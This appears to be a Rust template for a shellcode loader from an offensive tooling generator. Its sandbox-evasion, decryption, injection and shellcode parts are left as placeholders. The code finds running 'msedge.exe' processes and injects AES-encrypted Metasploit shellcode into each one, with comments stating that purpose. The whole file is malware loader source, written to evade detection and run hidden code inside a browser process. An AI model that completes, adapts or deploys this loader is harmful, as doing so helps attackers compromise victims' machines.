{{imports}}

{{sandbox_evasion}}

{{payload_decrypt}}


fn boxboxbox(tar: &str) -> Vec<u32> {
    // search for processes to inject into
    let mut dom: Vec<u32> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        //println!("{} {}", pro.pid(), pro.name());
        dom.push(pro.pid().as_u32());
    }
    return dom;
}

fn enhance(buf:&[u8], tar:&u32) {
    // injecting in target processes :)
    println!("[+] Targeting {}", tar);

    {{process_inject}}

}

fn main() {
    // inject in the following processes:
    let tar: &str = "msedge.exe";

    // aes encrypted msf shellcode :
    let enc_buf: {{obf_shellcode}}

    let list:Vec<u32> = boxboxbox(tar);
    if list.len() == 0 {
        panic!("[-] Unable to find a process.")
    }
    else {
        // thanks again to https://github.com/memN0ps/arsenal-rs/blob/ee385df07805515da5ffc2a9900d51d24a47f9ab/obfuscate_shellcode-rs/src/main.rs
        for i in &list {
            println!("[+] Found process {}", i);
            enhance(&buf, i);
        }
    }
}